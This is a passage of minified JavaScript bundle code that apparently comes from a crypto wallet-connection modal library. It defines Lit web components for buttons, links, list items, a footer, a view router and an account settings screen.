    opacity: 0.5;
    cursor: not-allowed;
  }
`;var dA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const pke={sm:"sm-medium",md:"md-medium"},mke={accent:"accent-primary",secondary:"secondary"};let gg=class extends $e{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.variant="accent",this.icon=void 0}render(){return X`
      <button ?disabled=${this.disabled} data-variant=${this.variant}>
        <slot name="iconLeft"></slot>
        <wui-text
          color=${mke[this.variant]}
          variant=${pke[this.size]}
        >
          <slot></slot>
        </wui-text>
        ${this.iconTemplate()}
      </button>
    `}iconTemplate(){return this.icon?X`<wui-icon name=${this.icon} size="sm"></wui-icon>`:null}};gg.styles=[Dt,nr,hke];dA([ie()],gg.prototype,"size",void 0);dA([ie({type:Boolean})],gg.prototype,"disabled",void 0);dA([ie()],gg.prototype,"variant",void 0);dA([ie()],gg.prototype,"icon",void 0);gg=dA([Ue("wui-link")],gg);const gke=mr``;var yke=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let z7=class extends $e{render(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state;return!e&&!n?null:X`
      <wui-flex
        .padding=${["4","3","3","3"]}
        flexDirection="column"
        alignItems="center"
        justifyContent="center"
        gap="3"
      >
        <wui-text color="secondary" variant="md-regular" align="center">
          We work with the best providers to give you the lowest fees and best support. More options
          coming soon!
        </wui-text>

        ${this.howDoesItWorkTemplate()}
      </wui-flex>
    `}howDoesItWorkTemplate(){return X` <wui-link @click=${this.onWhatIsBuy.bind(this)}>
      <wui-icon size="xs" color="accent-primary" slot="iconLeft" name="helpCircle"></wui-icon>
      How does it work?
    </wui-link>`}onWhatIsBuy(){tt.sendEvent({type:"track",event:"SELECT_WHAT_IS_A_BUY",properties:{isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}),we.push("WhatIsABuy")}};z7.styles=[gke];z7=yke([Ue("w3m-onramp-providers-footer")],z7);const s1={getTabsByNamespace(t){return!!t&&t===ge.CHAIN.EVM?de.state.remoteFeatures?.activity===!1?Z2.ACCOUNT_TABS.filter(n=>n.label!=="Activity"):Z2.ACCOUNT_TABS:[]},isValidReownName(t){return/^[a-zA-Z0-9]+$/gu.test(t)},isValidEmail(t){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/gu.test(t)},validateReownName(t){return t.replace(/\^/gu,"").toLowerCase().replace(/[^a-zA-Z0-9]/gu,"")},hasFooter(){const t=we.state.view;if(Z2.VIEWS_WITH_LEGAL_FOOTER.includes(t)){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state,r=de.state.features?.legalCheckbox;return!(!e&&!n||r)}return Z2.VIEWS_WITH_DEFAULT_FOOTER.includes(t)}},bke=ot`
  :host {
    display: block;
  }

  div.container {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    overflow: hidden;
    height: auto;
    display: block;
  }

  div.container[status='hide'] {
    animation: fade-out;
    animation-duration: var(--apkt-duration-dynamic);
    animation-timing-function: ${({easings:t})=>t["ease-out-power-2"]};
    animation-fill-mode: both;
    animation-delay: 0s;
  }

  div.container[status='show'] {
    animation: fade-in;
    animation-duration: var(--apkt-duration-dynamic);
    animation-timing-function: ${({easings:t})=>t["ease-out-power-2"]};
    animation-fill-mode: both;
    animation-delay: var(--apkt-duration-dynamic);
  }

  @keyframes fade-in {
    from {
      opacity: 0;
      filter: blur(6px);
    }
    to {
      opacity: 1;
      filter: blur(0px);
    }
  }

  @keyframes fade-out {
    from {
      opacity: 1;
      filter: blur(0px);
    }
    to {
      opacity: 0;
      filter: blur(6px);
    }
  }
`;var XB=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let I1=class extends $e{constructor(){super(...arguments),this.resizeObserver=void 0,this.unsubscribe=[],this.status="hide",this.view=we.state.view}firstUpdated(){this.status=s1.hasFooter()?"show":"hide",this.unsubscribe.push(we.subscribeKey("view",e=>{this.view=e,this.status=s1.hasFooter()?"show":"hide",this.status==="hide"&&document.documentElement.style.setProperty("--apkt-footer-height","0px")})),this.resizeObserver=new ResizeObserver(e=>{for(const n of e)if(n.target===this.getWrapper()){const r=`${n.contentRect.height}px`;document.documentElement.style.setProperty("--apkt-footer-height",r)}}),this.resizeObserver.observe(this.getWrapper())}render(){return X`
      <div class="container" status=${this.status}>${this.templatePageContainer()}</div>
    `}templatePageContainer(){return s1.hasFooter()?X` ${this.templateFooter()}`:null}templateFooter(){switch(this.view){case"Networks":return this.templateNetworksFooter();case"Connect":case"ConnectWallets":case"OnRampFiatSelect":case"OnRampTokenSelect":return X`<w3m-legal-footer></w3m-legal-footer>`;case"OnRampProviders":return X`<w3m-onramp-providers-footer></w3m-onramp-providers-footer>`;default:return null}}templateNetworksFooter(){return X` <wui-flex
      class="footer-in"
      padding="3"
      flexDirection="column"
      gap="3"
      alignItems="center"
    >
      <wui-text variant="md-regular" color="secondary" align="center">
        Your connected wallet may not support some of the networks available for this dApp
      </wui-text>
      <wui-link @click=${this.onNetworkHelp.bind(this)}>
        <wui-icon size="sm" color="accent-primary" slot="iconLeft" name="helpCircle"></wui-icon>
        What is a network
      </wui-link>
    </wui-flex>`}onNetworkHelp(){tt.sendEvent({type:"track",event:"CLICK_NETWORK_HELP"}),we.push("WhatIsANetwork")}getWrapper(){return this.shadowRoot?.querySelector("div.container")}};I1.styles=[bke];XB([Ee()],I1.prototype,"status",void 0);XB([Ee()],I1.prototype,"view",void 0);I1=XB([Ue("w3m-footer")],I1);const wke=ot`
  :host {
    display: block;
    width: inherit;
  }
`;var ej=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let R1=class extends $e{constructor(){super(),this.unsubscribe=[],this.viewState=we.state.view,this.history=we.state.history.join(","),this.unsubscribe.push(we.subscribeKey("view",()=>{this.history=we.state.history.join(","),document.documentElement.style.setProperty("--apkt-duration-dynamic","var(--apkt-durations-lg)")}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),document.documentElement.style.setProperty("--apkt-duration-dynamic","0s")}render(){return X`${this.templatePageContainer()}`}templatePageContainer(){return X`<w3m-router-container
      history=${this.history}
      .setView=${()=>{this.viewState=we.state.view}}
    >
      ${this.viewTemplate(this.viewState)}
    </w3m-router-container>`}viewTemplate(e){switch(e){case"AccountSettings":return X`<w3m-account-settings-view></w3m-account-settings-view>`;case"Account":return X`<w3m-account-view></w3m-account-view>`;case"AllWallets":return X`<w3m-all-wallets-view></w3m-all-wallets-view>`;case"ApproveTransaction":return X`<w3m-approve-transaction-view></w3m-approve-transaction-view>`;case"BuyInProgress":return X`<w3m-buy-in-progress-view></w3m-buy-in-progress-view>`;case"ChooseAccountName":return X`<w3m-choose-account-name-view></w3m-choose-account-name-view>`;case"Connect":return X`<w3m-connect-view></w3m-connect-view>`;case"Create":return X`<w3m-connect-view walletGuide="explore"></w3m-connect-view>`;case"ConnectingWalletConnect":return X`<w3m-connecting-wc-view></w3m-connecting-wc-view>`;case"ConnectingWalletConnectBasic":return X`<w3m-connecting-wc-basic-view></w3m-connecting-wc-basic-view>`;case"ConnectingExternal":return X`<w3m-connecting-external-view></w3m-connecting-external-view>`;case"ConnectingSiwe":return X`<w3m-connecting-siwe-view></w3m-connecting-siwe-view>`;case"ConnectWallets":return X`<w3m-connect-wallets-view></w3m-connect-wallets-view>`;case"ConnectSocials":return X`<w3m-connect-socials-view></w3m-connect-socials-view>`;case"ConnectingSocial":return X`<w3m-connecting-social-view></w3m-connecting-social-view>`;case"DataCapture":return X`<w3m-data-capture-view></w3m-data-capture-view>`;case"DataCaptureOtpConfirm":return X`<w3m-data-capture-otp-confirm-view></w3m-data-capture-otp-confirm-view>`;case"Downloads":return X`<w3m-downloads-view></w3m-downloads-view>`;case"EmailLogin":return X`<w3m-email-login-view></w3m-email-login-view>`;case"EmailVerifyOtp":return X`<w3m-email-verify-otp-view></w3m-email-verify-otp-view>`;case"EmailVerifyDevice":return X`<w3m-email-verify-device-view></w3m-email-verify-device-view>`;case"GetWallet":return X`<w3m-get-wallet-view></w3m-get-wallet-view>`;case"Networks":return X`<w3m-networks-view></w3m-networks-view>`;case"SwitchNetwork":return X`<w3m-network-switch-view></w3m-network-switch-view>`;case"ProfileWallets":return X`<w3m-profile-wallets-view></w3m-profile-wallets-view>`;case"Transactions":return X`<w3m-transactions-view></w3m-transactions-view>`;case"OnRampProviders":return X`<w3m-onramp-providers-view></w3m-onramp-providers-view>`;case"OnRampTokenSelect":return X`<w3m-onramp-token-select-view></w3m-onramp-token-select-view>`;case"OnRampFiatSelect":return X`<w3m-onramp-fiat-select-view></w3m-onramp-fiat-select-view>`;case"UpgradeEmailWallet":return X`<w3m-upgrade-wallet-view></w3m-upgrade-wallet-view>`;case"UpdateEmailWallet":return X`<w3m-update-email-wallet-view></w3m-update-email-wallet-view>`;case"UpdateEmailPrimaryOtp":return X`<w3m-update-email-primary-otp-view></w3m-update-email-primary-otp-view>`;case"UpdateEmailSecondaryOtp":return X`<w3m-update-email-secondary-otp-view></w3m-update-email-secondary-otp-view>`;case"UnsupportedChain":return X`<w3m-unsupported-chain-view></w3m-unsupported-chain-view>`;case"Swap":return X`<w3m-swap-view></w3m-swap-view>`;case"SwapSelectToken":return X`<w3m-swap-select-token-view></w3m-swap-select-token-view>`;case"SwapPreview":return X`<w3m-swap-preview-view></w3m-swap-preview-view>`;case"WalletSend":return X`<w3m-wallet-send-view></w3m-wallet-send-view>`;case"WalletSendSelectToken":return X`<w3m-wallet-send-select-token-view></w3m-wallet-send-select-token-view>`;case"WalletSendPreview":return X`<w3m-wallet-send-preview-view></w3m-wallet-send-preview-view>`;case"WalletSendConfirmed":return X`<w3m-send-confirmed-view></w3m-send-confirmed-view>`;case"WhatIsABuy":return X`<w3m-what-is-a-buy-view></w3m-what-is-a-buy-view>`;case"WalletReceive":return X`<w3m-wallet-receive-view></w3m-wallet-receive-view>`;case"WalletCompatibleNetworks":return X`<w3m-wallet-compatible-networks-view></w3m-wallet-compatible-networks-view>`;case"WhatIsAWallet":return X`<w3m-what-is-a-wallet-view></w3m-what-is-a-wallet-view>`;case"ConnectingMultiChain":return X`<w3m-connecting-multi-chain-view></w3m-connecting-multi-chain-view>`;case"WhatIsANetwork":return X`<w3m-what-is-a-network-view></w3m-what-is-a-network-view>`;case"ConnectingFarcaster":return X`<w3m-connecting-farcaster-view></w3m-connecting-farcaster-view>`;case"SwitchActiveChain":return X`<w3m-switch-active-chain-view></w3m-switch-active-chain-view>`;case"RegisterAccountName":return X`<w3m-register-account-name-view></w3m-register-account-name-view>`;case"RegisterAccountNameSuccess":return X`<w3m-register-account-name-success-view></w3m-register-account-name-success-view>`;case"SmartSessionCreated":return X`<w3m-smart-session-created-view></w3m-smart-session-created-view>`;case"SmartSessionList":return X`<w3m-smart-session-list-view></w3m-smart-session-list-view>`;case"SIWXSignMessage":return X`<w3m-siwx-sign-message-view></w3m-siwx-sign-message-view>`;case"Pay":return X`<w3m-pay-view></w3m-pay-view>`;case"PayLoading":return X`<w3m-pay-loading-view></w3m-pay-loading-view>`;case"FundWallet":return X`<w3m-fund-wallet-view></w3m-fund-wallet-view>`;case"PayWithExchange":return X`<w3m-deposit-from-exchange-view></w3m-deposit-from-exchange-view>`;case"PayWithExchangeSelectAsset":return X`<w3m-deposit-from-exchange-select-asset-view></w3m-deposit-from-exchange-select-asset-view>`;case"UsageExceeded":return X`<w3m-usage-exceeded-view></w3m-usage-exceeded-view>`;case"SmartAccountSettings":return X`<w3m-smart-account-settings-view></w3m-smart-account-settings-view>`;default:return X`<w3m-connect-view></w3m-connect-view>`}}};R1.styles=[wke];ej([Ee()],R1.prototype,"viewState",void 0);ej([Ee()],R1.prototype,"history",void 0);R1=ej([Ue("w3m-router")],R1);const vke=ot`
  button {
    background-color: transparent;
    padding: ${({spacing:t})=>t[1]};
  }

  button:focus-visible {
    box-shadow: 0 0 0 4px ${({tokens:t})=>t.core.foregroundAccent020};
  }

  button[data-variant='accent']:hover:enabled,
  button[data-variant='accent']:focus-visible {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  button[data-variant='primary']:hover:enabled,
  button[data-variant='primary']:focus-visible,
  button[data-variant='secondary']:hover:enabled,
  button[data-variant='secondary']:focus-visible {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  button[data-size='xs'] > wui-icon {
    width: 8px;
    height: 8px;
  }

  button[data-size='sm'] > wui-icon {
    width: 12px;
    height: 12px;
  }

  button[data-size='xs'],
  button[data-size='sm'] {
    border-radius: ${({borderRadius:t})=>t[1]};
  }

  button[data-size='md'],
  button[data-size='lg'] {
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  button[data-size='md'] > wui-icon {
    width: 16px;
    height: 16px;
  }

  button[data-size='lg'] > wui-icon {
    width: 20px;
    height: 20px;
  }

  button:disabled {
    background-color: transparent;
    cursor: not-allowed;
    opacity: 0.5;
  }

  button:hover:not(:disabled) {
    background-color: var(--wui-color-accent-glass-015);
  }

  button:focus-visible:not(:disabled) {
    background-color: var(--wui-color-accent-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
`;var aw=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Dp=class extends $e{constructor(){super(...arguments),this.size="md",this.disabled=!1,this.icon="copy",this.iconColor="default",this.variant="accent"}render(){const e={accent:"accent-primary",primary:"inverse",secondary:"default"};return X`
      <button data-variant=${this.variant} ?disabled=${this.disabled} data-size=${this.size}>
        <wui-icon
          color=${e[this.variant]||this.iconColor}
          size=${this.size}
          name=${this.icon}
        ></wui-icon>
      </button>
    `}};Dp.styles=[Dt,nr,vke];aw([ie()],Dp.prototype,"size",void 0);aw([ie({type:Boolean})],Dp.prototype,"disabled",void 0);aw([ie()],Dp.prototype,"icon",void 0);aw([ie()],Dp.prototype,"iconColor",void 0);aw([ie()],Dp.prototype,"variant",void 0);Dp=aw([Ue("wui-icon-link")],Dp);const Eke=ot`
  :host {
    width: 100%;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: ${({spacing:t})=>t[3]};
    width: 100%;
    background-color: ${({tokens:t})=>t.theme.backgroundPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
    transition:
      background-color ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      scale ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color, scale;
  }

  wui-text {
    text-transform: capitalize;
  }

  wui-image {
    color: ${({tokens:t})=>t.theme.textPrimary};
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    }
  }

  button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;var od=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Hc=class extends $e{constructor(){super(...arguments),this.imageSrc="google",this.loading=!1,this.disabled=!1,this.rightIcon=!0,this.rounded=!1,this.fullSize=!1}render(){return this.dataset.rounded=this.rounded?"true":"false",X`
      <button
        ?disabled=${this.loading?!0:!!this.disabled}
        data-loading=${this.loading}
        tabindex=${et(this.tabIdx)}
      >
        <wui-flex gap="2" alignItems="center">
          ${this.templateLeftIcon()}
          <wui-flex gap="1">
            <slot></slot>
          </wui-flex>
        </wui-flex>
        ${this.templateRightIcon()}
      </button>
    `}templateLeftIcon(){return this.icon?X`<wui-image
        icon=${this.icon}
        iconColor=${et(this.iconColor)}
        ?boxed=${!0}
        ?rounded=${this.rounded}
      ></wui-image>`:X`<wui-image
      ?boxed=${!0}
      ?rounded=${this.rounded}
      ?fullSize=${this.fullSize}
      src=${this.imageSrc}
    ></wui-image>`}templateRightIcon(){return this.rightIcon?this.loading?X`<wui-loading-spinner size="md" color="accent-primary"></wui-loading-spinner>`:X`<wui-icon name="chevronRight" size="lg" color="default"></wui-icon>`:null}};Hc.styles=[Dt,nr,Eke];od([ie()],Hc.prototype,"imageSrc",void 0);od([ie()],Hc.prototype,"icon",void 0);od([ie()],Hc.prototype,"iconColor",void 0);od([ie({type:Boolean})],Hc.prototype,"loading",void 0);od([ie()],Hc.prototype,"tabIdx",void 0);od([ie({type:Boolean})],Hc.prototype,"disabled",void 0);od([ie({type:Boolean})],Hc.prototype,"rightIcon",void 0);od([ie({type:Boolean})],Hc.prototype,"rounded",void 0);od([ie({type:Boolean})],Hc.prototype,"fullSize",void 0);Hc=od([Ue("wui-list-item")],Hc);const _ke=ot`
  :host {
    width: var(--local-width);
  }

  button {
    width: var(--local-width);
    white-space: nowrap;
    column-gap: ${({spacing:t})=>t[2]};
    transition:
      scale ${({durations:t})=>t.lg} ${({easings:t})=>t["ease-out-power-1"]},
      background-color ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-2"]},
      border-radius ${({durations:t})=>t.lg}
        ${({easings:t})=>t["ease-out-power-1"]};
    will-change: scale, background-color, border-radius;
    cursor: pointer;
  }

  /* -- Sizes --------------------------------------------------- */
  button[data-size='sm'] {
    border-radius: ${({borderRadius:t})=>t[2]};
    padding: 0 ${({spacing:t})=>t[2]};
    height: 28px;
  }

  button[data-size='md'] {
    border-radius: ${({borderRadius:t})=>t[3]};
    padding: 0 ${({spacing:t})=>t[4]};
    height: 38px;
  }

  button[data-size='lg'] {
    border-radius: ${({borderRadius:t})=>t[4]};
    padding: 0 ${({spacing:t})=>t[5]};
    height: 48px;
  }

  /* -- Variants --------------------------------------------------------- */
  button[data-variant='accent-primary'] {
    background-color: ${({tokens:t})=>t.core.backgroundAccentPrimary};
    color: ${({tokens:t})=>t.theme.textInvert};
  }

  button[data-variant='accent-secondary'] {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
    color: ${({tokens:t})=>t.core.textAccentPrimary};
  }

  button[data-variant='neutral-primary'] {
    background-color: ${({tokens:t})=>t.theme.backgroundInvert};
    color: ${({tokens:t})=>t.theme.textInvert};
  }

  button[data-variant='neutral-secondary'] {
    background-color: transparent;
    border: 1px solid ${({tokens:t})=>t.theme.borderSecondary};
    color: ${({tokens:t})=>t.theme.textPrimary};
  }

  button[data-variant='neutral-tertiary'] {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    color: ${({tokens:t})=>t.theme.textPrimary};
  }

  button[data-variant='error-primary'] {
    background-color: ${({tokens:t})=>t.core.textError};
    color: ${({tokens:t})=>t.theme.textInvert};
  }

  button[data-variant='error-secondary'] {
    background-color: ${({tokens:t})=>t.core.backgroundError};
    color: ${({tokens:t})=>t.core.textError};
  }

  button[data-variant='shade'] {
    background: var(--wui-color-gray-glass-002);
    color: var(--wui-color-fg-200);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  /* -- Focus states --------------------------------------------------- */
  button[data-size='sm']:focus-visible:enabled {
    border-radius: 28px;
  }

  button[data-size='md']:focus-visible:enabled {
    border-radius: 38px;
  }

  button[data-size='lg']:focus-visible:enabled {
    border-radius: 48px;
  }
  button[data-variant='shade']:focus-visible:enabled {
    background: var(--wui-color-gray-glass-005);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-gray-glass-002);
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  @media (hover: hover) {
    button[data-size='sm']:hover:enabled {
      border-radius: 28px;
    }

    button[data-size='md']:hover:enabled {
      border-radius: 38px;
    }

    button[data-size='lg']:hover:enabled {
      border-radius: 48px;
    }

    button[data-variant='shade']:hover:enabled {
      background: var(--wui-color-gray-glass-002);
    }

    button[data-variant='shade']:active:enabled {
      background: var(--wui-color-gray-glass-005);
    }
  }

  button[data-size='sm']:active:enabled {
    border-radius: 28px;
  }

  button[data-size='md']:active:enabled {
    border-radius: 38px;
  }

  button[data-size='lg']:active:enabled {
    border-radius: 48px;
  }

  /* -- Disabled states --------------------------------------------------- */
  button:disabled {
    opacity: 0.3;
  }
`;var qg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const Ake={lg:"lg-regular-mono",md:"md-regular-mono",sm:"sm-regular-mono"},Cke={lg:"md",md:"md",sm:"sm"};let Of=class extends $e{constructor(){super(...arguments),this.size="lg",this.disabled=!1,this.fullWidth=!1,this.loading=!1,this.variant="accent-primary"}render(){this.style.cssText=`
    --local-width: ${this.fullWidth?"100%":"auto"};
     `;const e=this.textVariant??Ake[this.size];return X`
      <button data-variant=${this.variant} data-size=${this.size} ?disabled=${this.disabled}>
        ${this.loadingTemplate()}
        <slot name="iconLeft"></slot>
        <wui-text variant=${e} color="inherit">
          <slot></slot>
        </wui-text>
        <slot name="iconRight"></slot>
      </button>
    `}loadingTemplate(){if(this.loading){const e=Cke[this.size],n=this.variant==="neutral-primary"||this.variant==="accent-primary"?"invert":"primary";return X`<wui-loading-spinner color=${n} size=${e}></wui-loading-spinner>`}return null}};Of.styles=[Dt,nr,_ke];qg([ie()],Of.prototype,"size",void 0);qg([ie({type:Boolean})],Of.prototype,"disabled",void 0);qg([ie({type:Boolean})],Of.prototype,"fullWidth",void 0);qg([ie({type:Boolean})],Of.prototype,"loading",void 0);qg([ie()],Of.prototype,"variant",void 0);qg([ie()],Of.prototype,"textVariant",void 0);Of=qg([Ue("wui-button")],Of);const Ske=ot`
  :host {
    display: block;
  }

  button {
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: ${({spacing:t})=>t[4]};
    padding: ${({spacing:t})=>t[3]};
    border-radius: ${({borderRadius:t})=>t[4]};
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  wui-flex > wui-icon {
    padding: ${({spacing:t})=>t[2]};
    color: ${({tokens:t})=>t.theme.textInvert};
    background-color: ${({tokens:t})=>t.core.backgroundAccentPrimary};
    border-radius: ${({borderRadius:t})=>t[2]};
    align-items: normal;
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.core.foregroundAccent020};
    }
  }
`;var f8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let P1=class extends $e{constructor(){super(...arguments),this.label="",this.description="",this.icon="wallet"}render(){return X`
      <button>
        <wui-flex gap="2" alignItems="center">
          <wui-icon weight="fill" size="md" name=${this.icon} color="inherit"></wui-icon>
          <wui-flex flexDirection="column" gap="1">
            <wui-text variant="md-medium" color="primary">${this.label}</wui-text>
            <wui-text variant="md-regular" color="tertiary">${this.description}</wui-text>
          </wui-flex>
        </wui-flex>
        <wui-icon size="lg" color="accent-primary" name="chevronRight"></wui-icon>
      </button>
    `}};P1.styles=[Dt,nr,Ske];f8([ie()],P1.prototype,"label",void 0);f8([ie()],P1.prototype,"description",void 0);f8([ie()],P1.prototype,"icon",void 0);P1=f8([Ue("wui-notice-card")],P1);var jae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let q7=class extends $e{constructor(){super(),this.unsubscribe=[],this.socialProvider=Be.getConnectedSocialProvider(),this.socialUsername=Be.getConnectedSocialUsername(),this.namespace=Y.state.activeChain,this.unsubscribe.push(Y.subscribeKey("activeChain",e=>{this.namespace=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=Ce.getConnectorId(this.namespace),n=Ce.getAuthConnector();if(!n||e!==ge.CONNECTOR_ID.AUTH)return this.style.cssText="display: none",null;const r=n.provider.getEmail()??"";return!r&&!this.socialUsername?(this.style.cssText="display: none",null):X`
      <wui-list-item
        ?rounded=${!0}
        icon=${this.socialProvider??"mail"}
        data-testid="w3m-account-email-update"
        ?chevron=${!this.socialProvider}
        @click=${()=>{this.onGoToUpdateEmail(r,this.socialProvider)}}
      >
        <wui-text variant="lg-regular" color="primary">${this.getAuthName(r)}</wui-text>
      </wui-list-item>
    `}onGoToUpdateEmail(e,n){n||we.push("UpdateEmailWallet",{email:e,redirectView:"Account"})}getAuthName(e){return this.socialUsername?this.socialProvider==="discord"&&this.socialUsername.endsWith("0")?this.socialUsername.slice(0,-1):this.socialUsername:e.length>30?`${e.slice(0,-3)}...`:e}};jae([Ee()],q7.prototype,"namespace",void 0);q7=jae([Ue("w3m-account-auth-button")],q7);var Vg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let kf=class extends $e{constructor(){super(),this.usubscribe=[],this.networkImages=Pi.state.networkImages,this.address=Y.getAccountData()?.address,this.profileImage=Y.getAccountData()?.profileImage,this.profileName=Y.getAccountData()?.profileName,this.network=Y.state.activeCaipNetwork,this.disconnecting=!1,this.remoteFeatures=de.state.remoteFeatures,this.usubscribe.push(Y.subscribeChainProp("accountState",e=>{e&&(this.address=e.address,this.profileImage=e.profileImage,this.profileName=e.profileName)}),Y.subscribeKey("activeCaipNetwork",e=>{e?.id&&(this.network=e)}),de.subscribeKey("remoteFeatures",e=>{this.remoteFeatures=e}))}disconnectedCallback(){this.usubscribe.forEach(e=>e())}render(){if(!this.address)throw new Error("w3m-account-settings-view: No account provided");const e=this.networkImages[this.network?.assets?.imageId??""];return X`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        gap="4"
        .padding=${["0","5","3","5"]}
      >
        <wui-avatar
          alt=${this.address}
          address=${this.address}
          imageSrc=${et(this.profileImage)}
          size="lg"
        ></wui-avatar>
        <wui-flex flexDirection="column" alignItems="center">
          <wui-flex gap="1" alignItems="center" justifyContent="center">
            <wui-text variant="h5-medium" color="primary" data-testid="account-settings-address">
              ${Cr.getTruncateString({string:this.address,charsStart:4,charsEnd:6,truncate:"middle"})}
            </wui-text>
            <wui-icon-link
              size="md"
              icon="copy"
              iconColor="default"
              @click=${this.onCopyAddress}
            ></wui-icon-link>
          </wui-flex>
        </wui-flex>
      </wui-flex>
      <wui-flex flexDirection="column" gap="4">
        <wui-flex flexDirection="column" gap="2" .padding=${["6","4","3","4"]}>
          ${this.authCardTemplate()}
          <w3m-account-auth-button></w3m-account-auth-button>
          <wui-list-item
            imageSrc=${et(e)}
            ?chevron=${this.isAllowedNetworkSwitch()}
            ?fullSize=${!0}
            ?rounded=${!0}
            @click=${this.onNetworks.bind(this)}
            data-testid="account-switch-network-button"
          >
            <wui-text variant="lg-regular" color="primary">
              ${this.network?.name??"Unknown"}
            </wui-text>
          </wui-list-item>
          ${this.smartAccountSettingsTemplate()} ${this.chooseNameButtonTemplate()}
          <wui-list-item
            ?rounded=${!0}
            icon="power"
            iconColor="error"
            ?chevron=${!1}
            .loading=${this.disconnecting}
            @click=${this.onDisconnect.bind(this)}
            data-testid="disconnect-button"
          >
